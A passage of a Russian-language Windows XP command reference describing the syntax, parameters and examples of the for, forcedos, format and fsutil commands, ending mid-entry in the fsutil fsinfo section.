- В команде for переменная %%переменная (или %%переменная) будет заменяться текстовой строкой из заданного параметра множество, пока параметр команда не обработает все файлы этого множества. - Имена параметров переменная команды for учитывают регистр буквы, они являются глобальными и одновременно может быть активно не больше 52 переменных. - Для обозначения параметра переменная можно использовать любые символы, кроме цифр 0–9, чтобы не было конфликта с параметрами пакетных файлов %0–%9. Для простых пакетных файлов вполне достаточно обозначений с одним символом, например %%f. - В сложных пакетных файлах могут быть использованы и другие обозначения для параметра переменная. - Задание множества файлов

Параметр множество может представлять группу файлов или несколько групп файлов. Для задания групп файлов можно использовать подстановочные знаки (* и ?). Следующие множества файлов являются допустимыми:

(*.doc)

(*.doc *.txt *.me)

(jan*.doc jan*.rpt feb*.doc feb*.rpt)

(ar??1991.* ap??1991.*)

Когда используется команда for, первое значение в параметре множество заменяет параметр %%переменная (или %переменная), а затем для обработки этого значения выполняется указанная команда. Это продолжается до тех пор, пока не будут обработаны все файлы (или группы файлов), которые соответствуют значению параметра множество.
- Использование ключевых слов in и do

In и do не являются параметрами, но они требуются для работы команды for. Если какое-то из слов пропущено, на экран будет выведено сообщение об ошибке.
- Использование дополнительных форм команды for

Если расширения командного процессора разрешены (по умолчанию), то поддерживаются следующие дополнительные формы команды for.
- Только каталоги

Если параметр множество содержит подстановочные знаки (* и ?), команда, указанная в параметре команда, выполняется для каждого каталога (кроме множества файлов в указанном каталоге), совпадающего с параметром множество. Используется следующий синтаксис.

for /D {%% | %}переменная in (множество) do команда [ПараметрыКоманднойСтроки]
- Рекурсивная

Проходит по дереву каталогов с корнем в [диск:]путь, выполняя инструкцию for для каждого каталога в дереве. Если после ключа /R не задан каталог, предполагается текущий каталог. Если параметр множество задано одной точкой (.), то команда просто перечислит каталоги в дереве. Используется следующий синтаксис.

for /R [[диск :]путь] {%% | %}переменная in (множество) do команда [ПараметрыКоманднойСтроки]
- Итерация диапазона значений

Используйте переменную итерации для установки начального значения (НачальноеЗначение#), а затем перемещайтесь по диапазону значений, пока значение не превысит конечное значение множества (КонечноеЗначение#). /L выполнит итерацию, сравнив параметр НачальноеЗначение# с параметром КонечноеЗначение#. Если параметрНачальноеЗначение# меньше параметра КонечноеЗначение#, то выполняется команда. Когда переменная итерации превысит параметр КонечноеЗначение#, командная оболочка покидает цикл. Также можно использовать отрицательный параметр шаг# для перемещения в диапазоне убывающих значений. Например, (1,1,5) создает последовательность «1 2 3 4 5», а (5,-1,1) создает последовательность «5 4 3 2 1». Используется следующий синтаксис.

for /L {%% | %}переменная in (НачальноеЗначение#,шаг#,КонечноеЗначение#) do команда [ПараметрыКоманднойСтроки]
- Итерация и разбор файлов

Разбор файлов следует использовать для обработки вывода команды, строк и содержимого файла. Используйте переменные итерации для определения содержимого или строк, которые требуется проверить. Параметр КлючевыеСловаРазбора используется для изменения разбора. Используйте параметр КлючевыеСловаРазбора маркер для указания маркеров, которые воспринимаются как переменные итерации. Примечание. Без параметра маркера ключ /F проверяет только первый маркер.

Разбор файлов состоит в чтении вывода, строки или содержимого файла, разбиении его на отдельные строки текста и разборе каждой строки на ноль или маркеры. Цикл программы for затем называется с переменной итерации, установленной в маркер. По умолчанию /F передает первый отделенный пробелом элемент из каждой строки каждого файла. Пустые строки пропускаются. Используется также другой синтаксис.

for /F ["КлючевыеСловаРазбора"] {%% | %}переменная in (МножествоИменФайлов) do команда [ПараметрыКоманднойСтроки]

for /F ["КлючевыеСловаРазбора"] {%% | %}переменная in ("СимвольнаяСтрока") do команда [ПараметрыКоманднойСтроки]

for /F ["КлючевыеСловаРазбора"] {%% | %}переменная in ('команда') do команда [ПараметрыКоманднойСтроки]

Аргумент МножествоИменФайлов задает одно или несколько имен файлов. Каждый файл открывается, считывается и обрабатывается до перехода к следующему файлу в аргументе МножествоИменФайлов. Чтобы переопределить стандартное поведение разбора, укажите параметр "КлючевыеСловаРазбора". Это строка, заключенная в кавычки, которая содержит одно или несколько ключевых слов для указания различных режимов разбора.

Если используется параметр usebackq, используйте один из приведенных ниже синтаксисов:

for /F ["usebackqКлючевыеСловаРазбора"] {%% | %}переменная in ("МножествоИменФайлов") do команда [ПараметрыКоманднойСтроки]

for /F ["usebackqКлючевыеСловаРазбора"] {%% | %}переменная in ('СимвольнаяСтрока') do команда [ПараметрыКоманднойСтроки]

for /F ["usebackqКлючевыеСловаРазбора"] {%% | %}переменная in (`команда`) do команда [ПараметрыКоманднойСтроки]

В приведенной ниже таблице перечислены ключевые слова разбора, которые используются для параметра КлючевыеСловаРазбора.
Ключевое слово     Описание
eol=c     Задает символ конца строки (только один символ).
skip=n     Задает число строк, пропускаемых в начале файла.
delims=xxx     Задает набор разделителей. Заменяет набор разделителей по умолчанию, состоящий из пробела и символа табуляции.
tokens=x,y,m-n     Задает элементы, передаваемые из каждой строки в тело цикла for при каждой итерации. В результате размещаются дополнительные имена переменных. Форма m-n задает диапазон, указывающий элементы с m-го по n-ый. Если последним символом строки tokens= является звездочка (*), то размещается дополнительная переменная, в которую помещается остаток строки после разбора последнего элемента.
usebackq     Задает возможность использования кавычек для имен файлов в параметре МножествоИменФайлов. Задает исполнение строки, заключенной в обратные кавычки, как команды, а строки в одиночных кавычках — как команды в символьной строке.
- Подстановка переменных

Были расширены модификаторы подстановок для ссылок на переменные в for. Приведенная ниже таблица перечисляет варианты синтаксических конструкций (на примере переменной I).
            Переменная с                       Описание
            модификатором
            %~I           Расширение %I, которое удаляет окружающие кавычки
                          ("").
            %~fI          Расширение %I до полного имени пути.
            %~dI          Замена %I именем диска.
            %~pI          Замена %I на путь.
            %~nI          Замена %I одним именем файла.
            %~xI          Замена %I расширением имени файла.
            %~sI          Замена путем, содержащим только короткие имена.
            %~aI          Замена %I атрибутами файла.
            %~tI          Замена %I временем модификации файла.
            %~zI          Замена %I размером файла.
                          Поиск в каталогах, перечисленных в переменной среды
                          PATH, и замена %I полным именем первого найденного
            %~$PATH:I     файла. Если переменная среды не определена или
                          поиск не обнаружил файлов, модификатор выдает
                          пустую строку.

Приведенная ниже таблица перечисляет комбинации модификаторов, которые можно использовать для получения более сложных результатов.
            Переменная с объединенными                Описание
                  модификаторами
            %~dpI                      Замена %I именем диска и путем.
            %~nxI                      Замена %I именем файла и расширением.
            %~fsI                      Замена %I полным именем пути с
                                       короткими именами.
                                       Поиск в каталогах, перечисленных в
            %~dp$PATH:I                переменной среды PATH, и замена %I
                                       именем диска и путем первого
                                       найденного файла.
            %~ftzaI                    Замена %I строкой, аналогичной
                                       результату работы программы dir.

В приведенных выше примерах %I и PATH могут быть заменены другими допустимыми значениями. Допустимое имя переменной for прекращает %~ syntax.

Использование прописных букв в именах переменных, например %I, может улучшить восприятие программы и позволит избежать недоразумений с модификаторами, в которых строчные и прописные буквы не различаются.
- Разбор строки

Конструкция for /F может быть использована непосредственно для строки. Для этого поместите параметр МножествоИменФайлов между скобками в одиночные кавычки ('МножествоИменФайлов'). Параметр МножествоИменФайлов будет воспринят как одиночная строка ввода из файла и будет разобран.
- Разбор вывода

Команду for /F можно использовать для разбора вывода команды. Для этого поместите параметр МножествоИменФайлов между скобками в обратные кавычки. Он будет воспринят как командная строка, которая передается дочернему интерпретатору командной строки Cmd.exe, а результаты работы команды помещаются в памяти и разбираются, как если бы они являлись файлом.
Примеры

В пакетных файлах используется следующий синтаксис для команды for:

for %%переменная in (множество) do команда [ПараметрыКоманднойСтроки]

Чтобы отобразить содержимое всех файлов, имеющих разрешение .doc или .txt, в текущем каталоге с помощью заменяемой переменной %f, введите следующую команду:

for %f in (*.doc *.txt) do type %f

В предыдущем примере каждый файл с расширением .doc или .txt в текущем каталоге будет подставляться вместо переменной %f, пока не будет выведено содержимое всех файлов. Чтобы использовать данную команду в пакетном файле, следует заменить все вхождения %f на %%f. В противном случае переменная игнорируется, и отображается сообщение об ошибке.

Чтобы произвести разбор файла, игнорируя комментарии, можно использовать следующую команду:

for /F "eol=; tokens=2,3* delims=," %i in (myfile.txt) do @echo %i %j %k

Данная команда производит разбор каждой строки в файле Myfile.txt, игнорируя строки, начинающиеся с точки с запятой, и передает второй и третий элементы из каждой строки в тело цикла команды FOR. Элементы разделяются запятыми и/или пробелами. Тело инструкции FOR использует %i для получения второго элемента, %j для получения третьего элемента и %k для получения оставшихся элементов в строке. Если имена файлов содержат пробелы, их следует заключать в кавычки (например, "ИмяФайла"). Для использования кавычек необходима команда usebackq. В противном случае кавычки рассматриваются как определение символьной строки для разбора.

Переменная %i объявлена явно в инструкции FOR, а %j и %k объявлены неявно с помощью tokens=. С помощью tokens= можно указать до 26 элементов, если это не вызовет попытки объявить переменную с именем, большим буквы "z" или "Z".

Для разбора вывода команды с помощью помещения параметра МножествоИменФайлов в скобки можно использовать следующую команду:
for /F "usebackq delims==" %i IN (`set`) DO @echo %i

В данном примере перечисляются имена переменных среды в текущем окружении.
========================================================================================
Forcedos

Запуск заданной программы в подсистеме MS-DOS. Эта команда необходима для тех программ MS-DOS, которые не распознаются системой Microsoft Windows XP.
Синтаксис

forcedos [/d каталог] ИмяФайла [параметры]
Параметры

/d каталог
    Задает текущий каталог для запускаемой программы.
ИмяФайла
    Обязательный параметр. Задает программу, которая будет запущена. Если файл программы не находится в текущем каталоге, необходимо задать имя каталога и диска.
параметры
    Задает параметры, которые будут переданы программе.
/?
    Отображает справку в командной строке.

Заметки
- Некоторые программы MS-DOS не распознаются системой Microsoft Windows XP как программы MS-DOS. Для запуска таких программ служит команда forcedos. - Все программы, запускаемые командой forcedos, открываются как приложения MS-DOS.
Примеры

Чтобы запустить программу Myprog из каталога \Oldapps и иметь возможность использовать каталог \Reports, введите следующую команду:

forcedos /d reports \oldapps\myprog
========================================================================================
Format

Форматирование диска в заданном дисководе для использования системой Windows.
Синтаксис

format том [/fs:ФайловаяСистема] [/v:метка] [/q] [/a:размер] [/c] [/x]

format том [/v:метка] [/q] [/f:размер]

format том [/v:метка] [/q] [/t:дорожки /n:сектора]

format том [/v:метка] [/q]

format том [/q]
Параметры

том
    Задает точку подключения, имя тома или имя диска, который необходимо отформатировать. Если никакие из следующих параметров командной строки не заданы, команда format будет использовать тип тома для определения параметров форматирования диска по умолчанию. 
/fs:ФайловаяСистема
    Тип файловой системы, которая будет создана на диске: FAT, FAT32 или NTFS. Гибкие диски могут использовать только файловую систему FAT.
/v:метка
    Задает метку тома. Если параметр командной строки /v пропущен или использован без задания метки, команда format выведет запрос для ввода метки тома после завершения форматирования. Чтобы отключить вывод запроса для ввода метки, введите параметр со следующим синтаксисом: /v:. Если с помощью команды format форматируется несколько дисков, всем дискам будет присвоена одна метка тома. Чтобы получить дополнительные сведения о метках томов, выберите Dir, Label и Vol из списка в ссылке "".
/a:размер
    Задает размер блоков выделения дискового пространства для систем FAT, FAT32 или NTFS. Если параметр размер не задан, он будет определен исходя из размера диска. В приведенной ниже таблице перечислены допустимые значения параметра размер.
    Значение     Описание
    512     Кластеры по 512 байта.
    1024     Кластеры по 1024 байта.
    2048     Кластеры по 2048 байта.
    4096     Кластеры по 4096 байта.
    8192     Кластеры по 8192 байта.
    16K     Кластеры по 16 Кбайт.
    32K     Кластеры по 32 Кбайт.
    64K     Кластеры по 64 Кбайт.
/q
    Выполняет быстрый формат. Удаляет таблицу файлов и корневой каталог ранее отформатированного тома без поиска поврежденных секторов. Параметр командной строки /q следует использовать только для форматирования дисков, которые находятся в хорошем состоянии.
-f:размер
    Задает емкость гибкого диска, под которую он будет отформатирован. По возможности используйте данный параметр параметр командной строки вместо параметров /f и /n. Windows допустимыми являются следующие значения размера:

    1440 , 1440k, 1440kb, 1.44, 1.44m, 1.44mb
    1,44 Мб, двухсторонний 3,5-дюймовый диск с четверной плотностью
/t:дорожки
    Задает количество дорожек на диске. По возможности используйте параметр командной строки /f вместо этого параметра командной строки. Если используется параметр командной строки /t, необходимо также использовать параметр /n. Указанные два параметра командной строки предлагают альтернативный способ задания размера форматируемого диска. Параметр командной строки /f невозможно использовать с параметром /t.
/n:сектора
    Задает количество секторов на дорожке. По возможности используйте параметр командной строки /f вместо этого параметра командной строки. Если используется параметр командной строки /n, необходимо также использовать параметр /t. Указанные два параметра командной строки предлагают альтернативный способ задания размера форматируемого диска. Параметр командной строки /f невозможно использовать с параметром /n.
/c
    Только для NTFS. Файлы, создаваемые на новом диске, будут по умолчанию сжиматься.
/x
    Вызывает отключение тома перед форматированием, если это необходимо. Все открытые дескрипторы тома становятся недействительными.
/?
    Отображает справку в командной строке.

Заметки
- Использование команды format на консоли восстановления

Команда format с другими параметрами доступна на консоли восстановления.
- Привилегии администратора

Чтобы форматировать жесткий диск с помощью этой команды, необходимо быть членом группы администраторов.
- Использование команды format

Команда format создает новый корневой каталог и файловую систему на диске. Также возможен поиск сбойных участков на диске и удаление всех данных с диска. Перед использованием нового диска он должен быть отформатирован с использованием этой команды.
- Ввод метки тома

После того, как гибкий диск будет отформатирован, команда format выведет на экран следующий запрос:

Метка тома (11 символов, ENTER - метка не нужна)?

Метка тома может состоять максимум из 11 символов (считая пробелы). Если ввод метки тома не требуется, следует просто нажать ENTER. Чтобы получить сведения о метках томов, выберите label из списка в ссылке "".
- Форматирование жестких дисков

Когда команда format используется для форматирования жесткого диска, перед началом форматирования командой formatна экран будет выведено следующее сообщение:

ВНИМАНИЕ, ВСЕ ДАННЫЕ НА НЕСЪЕМНОМ ДИСКЕ
x БУДУТ УНИЧТОЖЕНЫ!
Приступить к форматированию [Y(да)/N(нет)]?_

Для форматирования жесткого диска следует нажать Y; для отмены — N. Для форматирования жесткого диска надо иметь права администратора.
- Размер кластера

Файловая система FAT позволяет иметь на диске не больше 65526 кластеров. Файловая система FAT32 ограничивает число кластеров диапазоном от 65527 до 4177917.

Для дисков с размером кластера больше 4096 сжатие NTFS не поддерживается.
- Сообщения команды Format

После окончания процесса форматирования программой format на экран будет выведено сообщение, содержащее сведения об общем объеме диска, о сумме размеров поврежденных секторов и о пространстве, доступном для размещения файлов.
- Быстрое форматирование

Параметр командной строки /q позволяет ускорить процесс форматирования. Используйте этот параметр только для форматирования жестких дисков, заведомо не содержащих поврежденные сектора.
- Использование команды format с переназначенными и сетевыми дисками

Диски, созданные командой subst, не могут быть отформатированы командой format. Также невозможно форматирование сетевых дисков.
- Коды завершения команды Format

В следующей таблице перечислены коды завершения с кратким описанием.
Код завершения     Описание
0     Форматирование прошло успешно
1     Были заданы недопустимые параметры
4     Возникла фатальная ошибка (любая ошибка, кроме 0, 1 или 5).
5     В ответ на сообщение "Приступить к форматированию [Y(да)/N(нет)]?" была нажата клавиша N.

Коды завершения могут быть проверены с помощью переменной errorlevel в пакетной команде if.
Примеры

Чтобы отформатировать новый гибкий диск в дисководе A с использованием размера по умолчанию, следует ввести следующую команду:

format a:

Для быстрого форматирования ранее отформатированного диска в дисководе A можно использовать следующую команду:

format a: /q

Чтобы отформатировать гибкий диск в дисководе A и присвоить метку тома "DATA", следует использовать следующую команду:

format a: /v:DATA
========================================================================================
Fsutil

Fsutil является служебной программой командной строки, которая используется для выполнения связанных задач файловых систем FAT и NTFS, таких как управление точками повторной обработки, управление разреженными файлами, отключение тома или расширение тома. Поскольку программа fsutil является весьма мощной, ее должны применять только опытные пользователи, имеющие опыт работы с Microsoft Windows XP. Для использования программы fsutil необходимо войти в систему с помощью учетной записи администратор или члена группы администраторов.

В следующей таблице перечислены подкоманды команды fsutil.
Команда     Описание
behavior     Запрашивает, изменяет, включает или отключает настройки для создания имен файлов с длиной 8.3 символа, для возможности отображения расширенных символов в имена файлов длиной 8.3 символа в томах NTFS, для обновления штампа времени последнего доступа к томам NTFS, частоты событий, записанных в системных журнал, и количества места на диске, зарезервированного зоной основной таблицы файлов.
dirty     Запрос установки «грязного» бита тома. Задает «грязный» бит тома. Когда установлен «грязный» бит тома, autochk автоматически проверит том на наличие ошибок при следующей перезагрузке компьютера.
file     Обычно используется специалистами по технической поддержке. Поиск файла по идентификатору безопасности, запрос файла в размещенных диапазонах, установка короткого имени файла, допустимой длины данных или нулевых данных для файла.
fsinfo     Обычно используется специалистами по технической поддержке. Перечисляет все диски, запрашивает тип диска, сведения о томе, специальные сведения о томе NTFS или статистику файловой системы.
hardlink     Создает жесткую связь. Жесткая связь представляет запись каталога для файла. Каждый файл можно рассматривать как имеющий по крайней мере одну жесткую связь. В томах NTFS каждый файл имеет несколько жестких связей, следовательно один файл может отображаться во многих каталогах (или даже в одном каталоге под различными именами). Поскольку ссылки на все связи находятся в одном файле, программы могут открывать любую из связей и изменять файл. Файл удаляется из файловой системы только после удаления всех связей. После создания жесткой связи, программы могут использовать ее как любое другое имя файла.
objectid     Обычно используется специалистами по технической поддержке. Управляет идентификаторами объектов, которые используются Windows XP для отслеживания объектов, таких как файлы и каталоги.
quota     Управляет дисковыми квотами в томах NTFS для предоставления более точного контроля за сетевым носителем. Дисковые квоты внедрены в тома и включают внедрение ограничений жестких и съемных носителей в тома.
reparsepoint     Обычно используется специалистами по технической поддержке. Запрашивает или удаляет точки повторной обработки, являющиеся объектами файловой системы NTFS, которые имеют определяемый атрибут, содержащий контролируемые пользователем данные, и используются для расширения функциональности подсистемы ввода/вывода. Точки повторной обработки используют как точки соединения каталогов и точки подключения томов. Они также используются драйверами фильтров файловой системы, чтобы пометить определенные файлы как специфические для этого драйвера.
sparse     Управление разреженными файлами. Разреженным файлом называют файл, внутри которого имеется одна или несколько областей, незанятые данными. Программа будет рассматривать эти незанятые области как содержащие байты с нулевыми значениями, но не будет использовать пространство на диске для представления этих нулей. Другими словами, место выделяется для значимых (ненулевых) данных, тогда как место под незначимые данные (длинные строки, состоящие из нулей) не выделяется. При чтении разреженного файла выделенные данные возвращаются в том виде, в котором они сохранены, а невыделенные данные по умолчанию возвращаются в виде нулей, согласно требованиям спецификации безопасности C2. Поддержка разреженного файла позаоляет освобождать данные из любого места в файле.
usn     Обычно используется специалистами по технической поддержке. Управление журналом изменения номеров последовательных обновлений (USN), в котором сохраняется архив всех изменений файлов в томе.
volume     Управление томом. Отсоединяет том или запросы для отображения количества свободного места на диске.

Примечание
- Для отображения справки для доступных подкоманд в командной строке, введите fsutil, введите подкоманду, а затем введите команду help (fsutil подкоманда help). ========================================================================================
Fsutil: behavior

Запрашивает текущие настройки для создания имен файлов с длиной 8.3 символа, для возможности отображения расширенных символов в имена файлов длиной 8.3 символа в томах NTFS, для обновления штампа времени последнего доступа к томам NTFS, частоты событий, записанных в системных журнал, и количества места на диске, зарезервированного зоной основной таблицы файлов (MFT). Включение и отключение использование имен файлов длиной 8.3 символа путем разрешения расширенных символов в именах файлов длиной 8.3 символа в томах NTFS и обновления штампа времени последнего доступа к томам NTFS. Позволяет исменять частоту записи событий квот в системный журнал и количество места на диске, зарезервированноя для зоны основной таблицы файлов.
Синтаксис

fsutil behavior query {disable8dot3|allowextchar|disablelastaccess|quotanotify|mftzone}

fsutil behavior set [{disable8dot3 {1|0}|allowextchar {1|0}|disablelastaccess {1|0}|quotanotify частота|mftzone значение}]
Параметры

query
    Запрашивает параметры поведения файловой системы.
set
    Изменяет параметры поведения файловой системы.
disable8dot3 {1|0}
    Отключает создание имен файлов длиной 8.3 символа в томах с форматом FAT и NTFS.
allowextchar {1|0}
    Определяет, могут ли быть использованы символы из расширенного набора симполов, включая диакритические знаки, в коротких именах файлов 8.3 в томах NTFS.
disablelastaccess {1|0}
    Определяет, обновляет ли NTFS штамп времени последнего доступа в каждом каталоге при перечислении каталогов в томе NTFS.
quotanotify частота
    Настраивает частоту отчета о нарушении квот NTFS в системном журнале. Введите частоту (от 0 до 4294967295 секунд) записи нарушений квот в системный журнал. Значение по умолчанию составляет 1 час (3600 секунд).
mftzone значение
    Зона основной таблицы файлов (MFT) является зарезервированной областью, позволяющей основной таблице файлов при необходимости расширяться, чтобы предотвратить фрагментацию основной таблицы файлов. Устанавливает величину параметра значение от 1 (по умолчанию) до 4 (максимум). Параметр значение расположен в 8 части диска.

Заметки
- Подкоманда behavior записывает изменения в системный реестр, поэтому для всткпления изменений в силу необходимо перезагрузить компьютер.- Использование disable8dot3 {1|0}

Если disable8dot3 имеет значение 0, то каждый раз при создании файла с длинным именем NTFS создает вторую запись файла, имеющую длину имени файла 8.3 символа. Когда NTFS создает файлы в папке, необходимо выполнять поиск имен файлов длиной 8.3 символа, связанных с длинными именами файлов.

Данный параметр обновляет раздел реестра HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation.
- Использование allowextchar {1|0}

Данный параметр обновляет раздел реестра HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsAllowExtendedCharacterIn8dot3Name.
- Использование disablelastaccess {1|0}

Параметр disablelastaccess разработан для уменьшения воздействия ведения журнала обновления штампа времени последнего доступа к папкам и каталогам. Отключение времени последнего доступа увеличивает скорость доступа к папкам и файлам.

Каждый файл и папка в томе NTFS содержит атрибут, который называется время последнего доступа. Данный атрибут определяет время последнего доступа к файлу или папке, например, просмотр папок пользователем, добавление файлов в папку, чтение файла или внесение изменений в файл. Самое новое время последнего доступа хранится в памяти и записывается на диск в два различных расположения. Одно расположение внутри атрибута файла, который является частью записи основной таблицы файлов (MFT). Второе расположения является индексом каталога, в котором содержится файл.

Время последнего доступа на диске не всегда является текущим временем. Данное запаздывание возникает из-за задержки NTFS при записи времени последнего доступа на диск, когда пользователи или программы выполняют над файлом или папкой операции только для чтения, например, перечень содержимого папки или чтение (но не изменение) файла в папке. Если время последнего доступа совпадает с текущим временем на диске для операций чтения, все операции чтения становятся операциями записи и влияют на производительность NTFS.

Примечание. Запросы времени последнего доступа, основанные на файлах, являются даже если все значения на диске не являются текущими. NTFS возвращает правильное значение на запросы, поскольку точьное значение хранится в памяти.

NTFS обычно обновляет атрибут файла на диске на более поздний, если текущее время последнего доступа в памяти отличается более, чем на час от времени последнего доступа, хранимого на диске, или если все ссылки на файл в памяти пропали. Например, если текущее время последнего доступа к файлу 1:00 P.M., а файл был прочтен в 1:30 P.M., то NTFS не обновляет время последнего доступа. Если файл был прочтен снова в 2:00 P.M., NTFS обновляет время последнего доступа в атрибуте файла на 2:00 P.M., поскольку в атрибуте файла отображалось 1:00 P.M., а в время последнего доступа в памяти отображало 2:00 P.M.

NTFS обновляет индекс каталога, который содержит файл, при обновлении времени последнего доступа к файлу и обнаруживает, что время последнего доступа к файлу отличается более, чем на час от времени последнего доступа, которое хранится в индексе каталога. Данное обновление обычно происходит после закрытия программой дескриптора, используемого для доступа к файлу внутри каталога. Если пользователь держит дескриптор открытым для расширенного времени, возникает задержка перед отображением изменений в записи индекса каталога.

Примечание. Один час является максимальным временем, различимым NTFS при обновлении времени последнего доступа на диске. Если NTFS обновляет другие атрибуты файла, например, время последнего изменения, а время последнего доступа отложено, то NTFS обновляет время последнего доступа вместе с другими обновлениями без дополнительного воздействия на быстродействие.

Примечание. Использование параметра disablelastaccess может влиять на программы, использующие эту возможность, например, создание резервной копии и внешнее хранилище.

Данный параметр обновляет раздел реестра HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisableLastAccessUpdate.
- Использование mftzone значение

Параметр значение приблизительно равен начальному размеру основной таблицы файлов (MFT) плюс зона основной таблицы файлов на новом томе и устанавливается на время подключения для каждой файловой системы. При использовании пространства тома NTFS корректирует пространство, зарезервированное для будущего роста основной таблицы файлов. Если зона основной таблицы файлов уже большая, то полный размер зоны основной таблицы файлов снова не резервируется. Поскольку зона основной таблицы файлов основана на непрерывном диапазоне в конце основной таблицы файлов, она уменьшается, так как пространство используется.

Файловая система не переопределяет расположение зоны основной таблицы файлов, пока текущая зона основной таблицы файлов не будет полностью использована. В обычных системах этого не произойдет.
========================================================================================
Fsutil: dirty

Создает запрос, чтобы проверить, задан ли «грязный» бит тома. Задает «грязный» бит тома. Когда «грязный» бит тома задан, команда autochk автоматически проверит том на наличие ошибок при следующей перезагрузке компьютера.
Синтаксис

fsutil dirty {query|set} путь
Параметры

query
    Запрашивает «грязный» бит.
set
    Задает «грязный» бит тома.
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.

Примечания
- Если «грязный» бит тома задан, это может означать, что файловая система находится в неустойчивом состоянии. «Грязный» бит может быть задан, потому что том находится в подключенном состоянии и в нем имеются незаконченные изменения, из-за того что компьютер был выключен до того, как сделанные изменения были переданы на диск, или из-за обнаруженных повреждений тома. Если «грязный» бит задается при перезагрузке компьютера, командой chkdsk будет проведена проверка целостности тома.

При каждом запуске Windows XP ядро вызывает файл Autochk.exe для сканирования всех томов и проверки, заданы ли «грязные» биты томов. Если «грязный» бит задан, программа autochk немедленно запускает команду chkdsk /f для этого тома. Команда chkdsk /f проверяет целостность файловой системы и пытается устранить все возможные неисправности тома.
Примеры

Чтобы запросить «грязный» бит на диске C, введите:

fsutil dirty query C:

Пример выходных данных:

Том — C: изменен

или

Том — С: не изменен

Чтобы задать «грязный» бит на диске C, введите:

fsutil dirty set C:
========================================================================================
Fsutil: file

Обычно используется специалистами по технической поддержке. Находит файл по идентификатору безопасности, запрашивает выделенные под файл области, задает короткое имя файла, допустимую длину данных файла, нулевые данные для файла, или создает новый файл.
Синтаксис

fsutil file [createnew] путь длина

fsutil file [findbysid] пользователь путь

fsutil file [queryallocranges] offset=смещение length=длина путь

fsutil file [setshortname] путь короткое_имя

fsutil file [setvaliddata] путь длина_данных

fsutil file [setzerodata] offset=смещение length=длина путь
Параметры

createnew
    Создает файл с нулевым содержимым для указанных имени и размера.
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
длина
    Указывает допустимую длину данных файла.
findbysid
    Находит файлы указанного пользователя в томах NTFS. Пользователь определяется по идентификатору безопасности файла (SID).
Пользователь
    Указывает имя учетной записи или имя, с которым пользователь входит в систему.
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
queryallocranges
    Запрашивает выделенные для файла области в томе NTFS. Удобно использовать этот параметр для определения, имеет ли файл разреженные области.
offset=смещение
    Указывает начало нулевого диапазона.
length=длина
    Указывает длину области (в байтах).
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
setshortname
    Задает короткое имя (формат имени файла 8. 3) для файла в томе NTFS.
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
короткое_имя
    Указывает короткое имя файла.
setvaliddata
    Задает допустимую длину данных для файла области в томе NTFS.
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
длина_данных
    Указывает длину файла (в байтах). 
setzerodata
    Устанавливает нулевой диапазон (указанный параметрами смещение и длина), в котором файл будет обнулен. Если файл является разреженным, базовые кластеры не выделяются.
offset=смещение
    Указывает смещение файла, начало нулевого диапазона.
length=длина
    Указывает длину нулевого диапазона.
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.

Примечания
- Использование параметра setvaliddata

В NTFS существует два основных понятия длины файла: знак конца файла (EOF) и допустимая длина данных (VDL). Знак EOF показывает действительную длину файла. Параметр VDL определяет длину допустимых данных на диске. Все попытки чтения между знаками VDL и EOF автоматически возвращают ноль, чтобы обеспечить требование повторного использования объекта C2.

Параметр setvaliddata доступен только для администраторов, потому что его использование требует привилегию управления томами. Этот параметр требуется только для усовершенствованных мультимедиа и сценариев сетей SAN.
Примеры

Чтобы найти пользователя scottb на диске C по его идентификатору SID, введите:

fsutil file findbysid scottb C:\users

Чтобы запросить выделенные для файла области в томе NTFS, введите:

fsutil file queryallocranges offset=1024 length=64 C:\Temp\sample.txt

Чтобы задать короткое имя longfile.txt для файла longfilename.txt на диске C, введите:

fsutil file setshortname C:\longfilename.txt longfile.txt

Чтобы задать допустимую длину данных для файла области в томе NTFS, введите:

fsutil file setvaliddata C:\testfile.txt 4096

Чтобы задать нулевой диапазон для файла из тома NTFS, и обнулить этот диапазон введите:

fsutil file setzerodata offset=100 length=150 C:\Temp\sample.txt
========================================================================================
Fsutil: fsinfo

Обычно используется специалистами по технической поддержке. Перечисляет все приводы, запрашивает тип приводов, сведения о томах, сведения NTFS о томах и статистику файловой системы.
Синтаксис

fsutil fsinfo [drives]

fsutil fsinfo [drivetype] путь

fsutil fsinfo [ntfsinfo] корневой_путь

fsutil fsinfo [statistics] путь_тома

fsutil fsinfo [volumeinfo] корневой_путь
Параметры

drives
    Перечисляет все приводы на компьютере.
drivetype
    Запрашивает привод или выводит его тип, например CD-ROM дисковод.
ntfsinfo
    Перечисляет сведения NTFS для указанного тома: число секторов, общее число кластеров, свободные кластеры и начало и конец зоны основной таблицы файлов.
statistics
    Перечисляет статистику файловой системы для конкретного тома: метаданные, файл журнала, события чтения и записи MFT.
volumeinfo
    Перечисляет сведения для конкретного тома о файловой системе, поддержке учета регистра в именах файлов, именах файлов в формате Юникод и о дисковых квотах.
путь
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.
корневой_путь
    Указывает букву диска (с последующим двоеточием) корневого диска.
путь_тома
    Указывает букву диска (с последующим двоеточием), точку подключения или имя тома.

Примеры

Чтобы запросить тип диска для диска C, введите:

fsutil fsinfo drivetype C:

Возможные полученные ответы:
- Неизвестный привод- Нет такой корневой папки- Съемный диск- Жесткий диск- Внешний или сетевой диск- Компакт-дисковод- Электронный диск

Чтобы запросить сведения о томе для тома E, введите:

fsinfo volumeinfo E:\

Пример выходных данных:

Имя тома :
Серийный номер тома : 0xd0b634d9
Максимальная длина компонентов : 255
Имя файловой системы : NTFS
Поддерживает учет регистра в именах файлов
Сохраняет имена файлов с учетом регистра
Поддерживает использование Юникода к именах файлов
Поддерживает обязательное использование списков доступа <ACL>
Поддерживает сжатие файлов
Поддерживает дисковые квоты
Поддерживает разреженные файлы
Поддерживает точки повторной обработки
Поддерживает идентификаторы объектов
Поддерживает шифрование на уровне файловой системы EFS
Поддерживает поименованные объекты

Чтобы запросить сведения NTFS о томе для привода F, введите:

fsutil fsinfo ntfsinfo F:\

Пример выходных данных:

